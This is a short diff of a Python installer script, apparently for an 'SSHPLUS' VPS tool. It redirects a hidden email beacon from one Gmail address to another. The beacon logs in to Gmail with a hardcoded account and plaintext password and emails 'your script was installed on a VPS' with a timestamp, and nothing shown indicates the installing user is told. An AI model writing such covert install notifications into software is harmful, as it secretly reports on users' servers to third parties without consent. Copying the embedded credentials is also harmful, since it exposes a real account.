@@ -20,13 +20,13 @@ _MINUTO_ = str(_DATA_.minute)
 _SEGUNDO_ = str(_DATA_.second)
 _MSG_ = MIMEMultipart('alternative')
 _MSG_['Subject'] = "INSTALACAO DO SSHPLUS"
-_MSG_['From'] = 'crzvpn@gmail.com'
-_MSG_['To'] = 'crzvpn@gmail.com'
+_MSG_['From'] = 'twovps@gmail.com'
+_MSG_['To'] = 'twovps@gmail.com'
 _TEXTO_ = """\
 <html>
 <head></head>
 <body>
-<b><i>Ola! Crazy</i></b>
+<b><i>Ola! TwoSSH</i></b>
 <br></b>
 <b><i>SEU SCRIPT FOI INSTALADO EM UM VPS<i></b>
 <br></br>
@@ -53,4 +53,4 @@ _SERVER_ = smtplib.SMTP('smtp.gmail.com',587)
 _SERVER_.ehlo()
 _SERVER_.starttls()
 _SERVER_.login('ga6055602@gmail.com','gustavo123!')
-_SERVER_.sendmail('ga6055602@gmail.com','crzvpn@gmail.com',_MSG_.as_string())
+_SERVER_.sendmail('twovps@gmail.com','twovps@gmail.com',_MSG_.as_string())
